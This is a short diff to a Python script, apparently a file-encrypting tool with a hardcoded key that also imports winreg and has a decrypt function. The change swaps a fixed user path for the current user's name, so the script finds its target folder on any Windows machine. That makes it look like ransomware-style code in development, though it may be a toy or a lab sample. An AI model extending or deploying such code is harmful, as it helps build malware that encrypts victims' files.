@@ -6,6 +6,7 @@ import shutil
 import sys
 import winreg
 import time
+import getpass
 
 # Define block size for encryption
 BLOCK_SIZE = 16
@@ -113,7 +114,7 @@ def decrypt_files(directory, key):
 
 def main():
     # Directory to encrypt
-    dir_path = 'C:\\Users\\garrity\\Desktop\\EncryptThis'
+    dir_path = f'C:\\Users\\{getpass.getuser()}\\Desktop\\EncryptThis'
 
     # Key
     key = b'whoops_whoops_69'
